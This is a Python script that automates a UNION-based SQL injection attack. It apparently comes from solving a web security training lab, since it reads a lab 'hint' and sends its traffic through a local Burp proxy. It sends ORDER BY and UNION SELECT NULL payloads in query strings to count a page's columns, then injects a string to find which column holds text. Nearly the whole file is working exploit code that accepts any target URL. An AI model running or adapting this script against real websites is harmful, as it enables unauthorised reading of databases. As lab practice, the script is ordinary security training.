import requests
import sys
import re
import urllib3
from bs4 import BeautifulSoup
import signal

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Proxies for Burp.
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


""" column_number(payload_type, url, path_param) ###############################

############################################################################ """
def column_number(payload_type, url, path_param):
    # Run exploit with ORDER BY clause.
    if payload_type == "orderby":
        print("[+] Using the ORDER BY clause.")
        print("[+] Figuring out number of columns...")
        for i in range(1,25):
            # Assemble payload.
            sql_payload = "'+order+by+%s--" %i
            print(f"{i} : {sql_payload}")
            # sql_payload = "{}%s{}".format(payload[0], payload[1]) %i
            # Get request with payload.
            r = requests.get(url + path_param + sql_payload, verify=False, proxies=proxies)
            # Get the text from the request.
            res = r.text
            # If Internal Server Error is found in the text, column is the previous index. 
            if "Internal Server Error" in res:
                print(f"{i} : Internal Server Error hits at column {i}.")
                # Subtract 1 from where index stopped to get number of columns.
                return i - 1
        return False
    # Run exploit with UNION operation.
    elif payload_type == "union":
        print("[+] Using a UNION operation.")
        print("[+] Figuring out number of columns...")
        sql_payload = "'+UNION+select+NULL--"
        text = ",+NULL"
        substr = "--"
        index = sql_payload.index(substr)
        union = False
        for i in range(1,25):
            # Count the number of NULL.
            num = sql_payload.count("NULL")
            # If current index is first NULL, run it for the first time.
            if num == 1 and union == False:
                print(f"{i} : {sql_payload}")
                # Get request with first payload.
                r = requests.get(url + path_param + sql_payload, verify=False, proxies=proxies)
                # Get the text from the request.
                res = r.text
                # Assemble Payload and add another NULL
                sql_payload = sql_payload[:index] + text + sql_payload[index:]
                # If UNION select is printed in HTML on first index, return column number.
                if "UNION select" in res:
                    return i
            # If current index passed first NULL, keep adding NULL to string. 
            elif num > 1 and union == False:
                    print(f"{i} : {sql_payload}")
                    sql_payload = sql_payload[:index] + text + sql_payload[index:]
                    r = requests.get(url + path_param + sql_payload, verify=False, proxies=proxies)
                    res = r.text
                    if "UNION select" in res:
                        union = True
            # If current index passed first NULL and union is true, the column has been found.
            elif num > 1 and union == True:
                print(f"{i} : {sql_payload}")
                print(f"{i} : UNION select printed in HTML at column {i}.")
                return i
        return False


""" get_string(url, path_param) ################################################
Extract and return the string from the HTML that you need to solve the lab.
############################################################################ """
def get_string(url, path_param):
    try:
        req = requests.get(url + path_param, verify=False, proxies=proxies)
        soup = BeautifulSoup(req.text, 'html.parser')
        # Get the p tag with the hint id.
        results = soup.find('p', attrs={'id':'hint'})
        #res = re.search(r"'\s*([^']+?)\s*'", str(results)).groups()[0]
        #print('%r' % res)
        # Get the characters between the single quotes in the text.
        res = re.search(r"'([^']*)'", str(results)).groups()[0]
        #print(res)
        return res
    except Exception as e:
        template = "An exception of type {0} occurred. Arguments:\n{1!r}"
        #message = template.format(type(e).__name__, e.args)     
        if type(e).__name__ == 'ProxyError':
            print("Error Type: ProxyError. Check the proxy.")
        else:    
            print('Error Return Type: ', type(e))
            

""" exploit_sqli_string(num_col, url, path_param, hint) ########################
Loop though the column numbers, test each request for SQLi and check the HTML 
for when the query text matches the original hint.
############################################################################ """
def exploit_sqli_string(num_col, url, path_param, hint):
    #print(url, path_param, hint)
    for i in range(1, num_col+1):
        string = f"'{hint}'"
        string_strip = string.strip('\'')
        #print(i, string)
        payload_list = ['NULL'] * num_col
        payload_list[i-1] = string
        print(i, payload_list)
        sql_payload = "' union select " + ', '.join(payload_list) + "--"
        print(i, sql_payload)
        req = requests.get(url + path_param + sql_payload, verify=False, proxies=proxies)
        soup = BeautifulSoup(req.text, 'html.parser')
        res = soup.find('section', attrs={'class':'maincontainer'})
        hint_output = re.search(hint, str(res))
        if hint_output is not None and string_strip == hint_output.group():
        #if hint_output is not None:
            print(i, hint_output.group())
            return i
        elif hint_output is None:
            print(f"{string} was not found.")
    return False


def signal_handler(sig, frame):
    print("\n[+] Exploit aborted with Ctrl-c.")
    # Run any clean up commands here.
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)

if __name__ == "__main__":
    try:
        payload_type = sys.argv[1].strip()
        url = sys.argv[2].strip()
        path_param = sys.argv[3].strip()
    except IndexError:
        print("[-] Usage: %s <payload_type> <url> <path_param>" % sys.argv[0])
        print('[-] Example: %s orderby https://website.net "/filter?category=Gifts"' % sys.argv[0])
        print('[-] Example: %s union https://website.net "/filter?category=Gifts"' % sys.argv[0])
        sys.exit(-1)

    hint = get_string(url, path_param)
    num_col = column_number(payload_type, url, path_param)
    if num_col:
        print("[+] SQL injection successful...")
        print("[+] The number of columns is " + str(num_col) + "." )
        print("[+] Figuring out which column contains text...")
        string_column = exploit_sqli_string(num_col, url, path_param, hint)
        if string_column:
            print("[+] Column " + str(string_column) + " contains text, a data type.")
        else:
            print("[-] Can't find a column that has a string data type.")
    else:
        print("[-] The SQLi was not successful...")


